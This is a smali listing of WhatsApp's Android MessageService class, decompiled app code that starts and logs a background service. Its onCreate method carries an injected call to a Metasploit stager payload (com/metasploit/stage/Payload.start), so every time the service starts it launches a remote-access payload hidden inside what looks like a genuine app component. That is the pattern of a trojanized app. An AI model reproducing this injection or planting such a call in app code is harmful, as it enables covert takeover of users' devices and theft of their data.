.class public Lcom/whatsapp/messaging/MessageService;
.super Landroid/app/Service;
.source ""


# instance fields
.field public final A00:LX/04f;

.field public final A01:LX/01d;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 83426
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 83427
    invoke-static {}, LX/04f;->A00()LX/04f;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/messaging/MessageService;->A00:LX/04f;

    .line 83428
    invoke-static {}, LX/01d;->A00()LX/01d;

    move-result-object v0

    iput-object v0, p0, Lcom/whatsapp/messaging/MessageService;->A01:LX/01d;

    return-void
.end method

.method public static A00(Landroid/content/Context;)V
    .locals 2

    .line 83429
    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/messaging/MessageService;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "com.whatsapp.messaging.MessageService.START"

    .line 83430
    invoke-virtual {v1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 83431
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    const-string v0, "messageservice/startService success"

    .line 83432
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    return-void
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception p0

    .line 83433
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1a

    if-ge v1, v0, :cond_0

    .line 83434
    throw p0

    .line 83435
    :cond_0
    return-void
.end method

.method public static A01(Landroid/content/Context;LX/0OE;)V
    .locals 2

    .line 83436
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1a

    if-lt v1, v0, :cond_0

    .line 83437
    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/whatsapp/messaging/MessageService;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "com.whatsapp.messaging.MessageService.START"

    .line 83438
    invoke-virtual {v1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 83439
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    const-string v0, "messageservice/startOnForeground success"

    .line 83440
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    return-void
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v1

    const-string v0, "messageservice/startOnForeground failed"

    .line 83441
    invoke-static {v0, v1}, Lcom/whatsapp/util/Log;->e(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 83442
    invoke-virtual {p1}, LX/0OE;->A01()V

    :cond_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 1

    const-string v0, "messageservice/onCreate"

    .line 83443
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83444
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    
    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .line 83445
    return-void
.end method

.method public onDestroy()V
    .locals 1

    const-string v0, "messageservice/onDestroy"

    .line 83446
    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    .line 83447
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 83448
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    .line 83449
    invoke-static {}, LX/01d;->A01()Z

    move-result v1

    const/4 v0, 0x1

    if-eqz v1, :cond_0

    return v0

    :cond_0
    if-eqz p1, :cond_1

    .line 83450
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 83451
    :cond_1
    return v0
.end method
